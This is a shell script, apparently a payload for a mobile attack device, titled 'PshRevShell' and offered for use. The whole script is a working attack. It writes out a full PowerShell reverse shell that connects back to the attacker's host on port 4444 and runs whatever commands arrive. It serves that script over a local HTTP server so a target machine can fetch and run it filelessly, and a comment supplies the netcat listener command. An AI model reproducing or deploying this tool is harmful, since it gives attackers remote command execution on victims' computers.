#!/bin/sh
# Title: PshRevShell
# Description: A fileless PowerShell reverse shell
# Author: Droid-MAX
# Date: 28/07/2020
#
# A netcat listener should be ran on the attacker host before executing the payload (ex: "nc -nvlp 4444")
# Requirements: python2

iface_name="wlan0"
reverse_ip=$(ifconfig $iface_name | grep inet | head -n1 | awk '{print $2}')
reverse_port=4444
web_root="/sdcard/tmp"
psh_name="Invoke-PowerShellTcpOneLine.ps1"
psh_path="$web_root/$psh_name"
listen_port=8080

do_start(){
    mkdir -p $web_root
    echo "\$client = New-Object System.Net.Sockets.TCPClient('${reverse_ip}',${reverse_port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" > $psh_path
    cd $web_root && python2 -m SimpleHTTPServer $listen_port &
}

do_stop(){
    killall python2
    rm $psh_path
}

case "$1" in
    start)
        do_start
        ;;
    stop)
        do_stop
        ;;
    restart)
        do_stop
        sleep 1
        do_start
        ;;
    *)
        echo "Usage: $0 {start|stop|restart}"
        exit 1
        ;;
esac
